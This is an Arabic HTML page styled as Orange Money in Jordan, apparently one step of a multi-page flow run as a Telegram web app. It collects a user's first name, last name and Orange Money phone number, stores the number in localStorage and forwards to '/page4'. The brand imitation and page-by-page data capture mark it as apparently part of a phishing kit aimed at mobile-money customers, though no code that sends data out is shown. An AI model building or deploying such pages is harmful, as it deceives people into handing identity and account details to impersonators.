<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أورانج موني - المعلومات الشخصية</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --orange-primary: #f16e00; --bg-color: #e5e5e5; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; font-family: sans-serif; }
        .app-header { width: 100%; background-color: var(--orange-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0; padding: 32px 24px; border-radius: 16px; }
        .form-group { margin-bottom: 22px; text-align: right; }
        .form-group label { font-weight: 700; display: block; margin-bottom: 10px; }
        .form-control { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 10px; text-align: right; }
        .phone-group { display: flex; gap: 10px; direction: ltr; }
        .country-prefix { background: #f5f5f5; border: 1px solid #e2e8f0; padding: 0 14px; border-radius: 10px; display: flex; align-items: center; font-weight: bold; }
        .btn-next { background: var(--orange-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
<div class="app-header"><a href="/page2" style="color:white;text-decoration:none;">رجوع</a></div>
<div class="card">
    <h2>المعلومات الشخصية</h2>
    <form onsubmit="goNext(event)">
        <div class="form-group"><label>الاسم الأول</label><input type="text" id="firstName" class="form-control" required></div>
        <div class="form-group"><label>اسم العائلة</label><input type="text" id="lastName" class="form-control" required></div>
        <div class="form-group"><label>رقم هاتف أورانج موني</label>
            <div class="phone-group">
                <input type="tel" id="phone" class="form-control" placeholder="791234567" maxlength="9" required>
                <div class="country-prefix"><span>+962</span><span>🇯🇴</span></div>
            </div>
        </div>
        <button type="submit" class="btn-next">متابعة</button>
    </form>
</div>
<script>
    function goNext(e) {
        e.preventDefault();
        localStorage.setItem('phone', document.getElementById('phone').value);
        window.location.href = "/page4";
    }
</script>
</body>
</html>
